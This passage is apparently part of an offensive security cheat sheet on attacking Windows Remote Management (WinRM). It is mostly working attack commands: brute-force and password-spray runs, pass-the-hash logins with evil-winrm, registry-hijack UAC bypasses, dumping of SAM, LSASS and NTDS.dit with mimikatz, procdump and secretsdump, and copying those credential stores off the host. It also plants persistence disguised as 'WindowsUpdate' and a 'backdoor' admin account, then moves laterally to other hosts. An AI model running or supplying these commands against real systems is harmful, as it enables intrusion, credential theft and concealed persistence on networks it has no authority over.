COMPLETE ATTACK CHAIN <a name="winrm"></a>

## 1.1 THEORY & BACKGROUND

**Windows Remote Management (WinRM)**:
- **Protocol**: WS-Management (Web Services Management)
- **Default Ports**: 5985/TCP (HTTP), 5986/TCP (HTTPS)
- **Authentication**: NTLM, Kerberos, CredSSP, Basic (over HTTPS)
- **Purpose**: Remote Windows management, PowerShell remoting

**Note**: WinRM was partially covered in the Remote PowerShell section. This section focuses on WinRM-specific attacks.

---

## 1.2 ENUMERATION PHASE

**Scan for WinRM:**
```bash
# Nmap:
nmap -p 5985,5986 --open 192.168.1.0/24

# With scripts:
nmap -p 5985,5986 --script http-title 192.168.1.100

# Check if accessible:
crackmapexec winrm 192.168.1.100 -u guest -p ''
```

**From Windows:**
```powershell
# Test WinRM:
Test-WSMan -ComputerName 192.168.1.100

# Check configuration:
winrm get winrm/config

# Enumerate WinRM instances:
winrm enumerate winrm/config/listener

# Check if service running:
Get-Service WinRM
```

---

## 1.3 EXPLOITATION PHASE

### 1.3.1 Authentication Attacks

**From Linux:**
```bash
# evil-winrm (best tool for WinRM):
evil-winrm -i 192.168.1.100 -u administrator -p 'Admin123!'

# With domain:
evil-winrm -i 192.168.1.100 -u administrator -p 'Admin123!' -d CORP

# Pass-the-hash:
evil-winrm -i 192.168.1.100 -u administrator -H 'NTLM_HASH'

# SSL/TLS:
evil-winrm -i 192.168.1.100 -u administrator -p 'Admin123!' -S -P 5986

# With scripts directory:
evil-winrm -i 192.168.1.100 -u administrator -p 'Admin123!' -s /opt/scripts

# With executables directory:
evil-winrm -i 192.168.1.100 -u administrator -p 'Admin123!' -e /opt/exe

# Brute force with crackmapexec:
crackmapexec winrm 192.168.1.100 -u users.txt -p passwords.txt

# Password spray:
crackmapexec winrm 192.168.1.0/24 -u administrator -p 'Summer2023!' --continue-on-success
```

**From Windows:**
```powershell
# Enter remote session:
$cred = Get-Credential
Enter-PSSession -ComputerName 192.168.1.100 -Credential $cred

# Execute command:
Invoke-Command -ComputerName 192.168.1.100 -Credential $cred -ScriptBlock {whoami}

# Persistent session:
$session = New-PSSession -ComputerName 192.168.1.100 -Credential $cred
Invoke-Command -Session $session -ScriptBlock {whoami}
Invoke-Command -Session $session -ScriptBlock {hostname}
Enter-PSSession -Session $session

# Multiple targets:
$computers = "192.168.1.100","192.168.1.101","192.168.1.102"
Invoke-Command -ComputerName $computers -Credential $cred -ScriptBlock {
    whoami
    hostname
}
```

### 1.3.2 Post-Exploitation via WinRM

**File Operations:**
```powershell
# From evil-winrm:
# Upload file:
upload /opt/payload.exe C:\Windows\Temp\payload.exe

# Download file:
download C:\Windows\System32\config\SAM /tmp/SAM

# From PowerShell:
# Upload:
$session = New-PSSession -ComputerName 192.168.1.100 -Credential $cred
Copy-Item -Path .\payload.exe -Destination C:\Windows\Temp\ -ToSession $session

# Download:
Copy-Item -Path C:\Windows\System32\config\SAM -Destination .\SAM -FromSession $session

# Execute uploaded file:
Invoke-Command -Session $session -ScriptBlock {C:\Windows\Temp\payload.exe}
```

**Enumeration:**
```powershell
# After connecting via evil-winrm or Enter-PSSession:

# System info:
systeminfo
hostname
whoami /all

# Users and groups:
net user
net localgroup administrators
net user /domain
net group "Domain Admins" /domain

# Processes:
Get-Process
tasklist /v

# Services:
Get-Service
sc query

# Network:
ipconfig /all
route print
arp -a
netstat -ano

# Firewall:
netsh advfirewall show allprofiles
Get-NetFirewallRule

# Scheduled tasks:
schtasks /query /fo LIST /v
Get-ScheduledTask

# Installed software:
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName,DisplayVersion

# Shares:
net share
Get-SmbShare

# Drives:
Get-PSDrive

# PowerShell history:
Get-Content (Get-PSReadlineOption).HistorySavePath

# Credentials:
cmdkey /list

# DPAPI blobs:
ls C:\Users\*\AppData\Roaming\Microsoft\Protect\
ls C:\Users\*\AppData\Local\Microsoft\Protect\

# Saved RDP connections:
reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"

# AutoRuns:
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

**Privilege Escalation:**
```powershell
# Check privileges:
whoami /priv

# If SeImpersonatePrivilege enabled:
# Use PrintSpoofer, RoguePotato, JuicyPotato, etc.

# Upload PrintSpoofer:
upload /opt/PrintSpoofer.exe C:\Windows\Temp\PrintSpoofer.exe

# Execute:
C:\Windows\Temp\PrintSpoofer.exe -i -c cmd

# If admin but UAC enabled:
# Bypass UAC:
# Method 1: fodhelper.exe
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /t REG_SZ /f
fodhelper.exe

# Method 2: eventvwr.exe
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f
eventvwr.exe

# Check for vulnerable services:
Get-Service | Where-Object {$_.Status -eq "Running"}
# Look for services with weak permissions

# Kernel exploits:
systeminfo
# Search for applicable exploits on exploit-db based on OS version
```

**Credential Harvesting:**
```powershell
# Dump SAM (requires SYSTEM):
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY

# Download and crack offline:
download C:\Windows\Temp\SAM /tmp/SAM
download C:\Windows\Temp\SYSTEM /tmp/SYSTEM
download C:\Windows\Temp\SECURITY /tmp/SECURITY

# On attacker machine:
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

# Mimikatz via WinRM:
# Upload mimikatz:
upload /opt/mimikatz.exe C:\Windows\Temp\mimi.exe

# Execute:
Invoke-Command -Session $session -ScriptBlock {
    C:\Windows\Temp\mimi.exe privilege::debug sekurlsa::logonpasswords exit
}

# Or use Invoke-Mimikatz:
upload /opt/Invoke-Mimikatz.ps1 C:\Windows\Temp\Invoke-Mimikatz.ps1
Invoke-Command -Session $session -FilePath C:\Windows\Temp\Invoke-Mimikatz.ps1
Invoke-Command -Session $session -ScriptBlock {Invoke-Mimikatz}

# LSASS dump:
# Method 1: Task Manager (if GUI):
# Right-click lsass.exe → Create dump file

# Method 2: procdump:
upload /opt/procdump.exe C:\Windows\Temp\procdump.exe
C:\Windows\Temp\procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
download C:\Windows\Temp\lsass.dmp /tmp/lsass.dmp

# Parse offline with mimikatz:
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords

# NTDS.dit (if Domain Controller):
# Create shadow copy:
wmic shadowcopy call create Volume=C:\
vssadmin list shadows

# Copy NTDS.dit and SYSTEM:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\Temp\NTDS.dit
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM

# Download:
download C:\Windows\Temp\NTDS.dit /tmp/NTDS.dit
download C:\Windows\Temp\SYSTEM /tmp/SYSTEM

# Extract hashes:
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

**Persistence:**
```powershell
# Create new admin user:
net user backdoor Password123! /add
net localgroup administrators backdoor /add

# Registry run key:
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f

# Scheduled task:
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\payload.exe" /sc onlogon /ru SYSTEM

# Service:
sc create "WindowsUpdate" binPath= "C:\Windows\Temp\payload.exe" start= auto
sc start "WindowsUpdate"

# WMI event subscription (covered in WMI section)

# Golden ticket (if DC compromised):
# With krbtgt hash from NTDS.dit:
# Use mimikatz to create golden ticket
```

**Lateral Movement:**
```powershell
# From compromised machine, move to others:

# Check network:
Get-ADComputer -Filter * | Select Name,IPv4Address

# Or:
1..254 | ForEach-Object {
    $ip = "192.168.1.$_"
    if (Test-Connection -ComputerName $ip -Count 1 -Quiet) {
        Write-Host "$ip is up"
    }
}

# Try credentials on other machines:
$cred = Get-Credential
$targets = Get-Content C:\Windows\Temp\targets.txt

foreach ($target in $targets) {
    try {
        Invoke-Command -ComputerName $target -Credential $cred -ScriptBlock {hostname} -ErrorAction Stop
        Write-Host "[+] $target - SUCCESS"
    } catch {
        Write-Host "[-] $target - FAILED"
    }
}

# Pass-the-hash to other systems:
# From Linux with evil-winrm:
evil-winrm -i 192.168.1.101 -u administrator -H 'NTLM_HASH'

# PSExec-style lateral movement:
# Upload PSExec:
upload /opt/PsExec.exe C:\Windows\Temp\PsExec.exe

# Execute on remote system:
C:\Windows\Temp\PsExec.exe \\192.168.1.101 -u administrator -p Password123! cmd

# WMI lateral movement:
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\output.txt" -ComputerName 192.168.1.101 -Credential $cred
```

---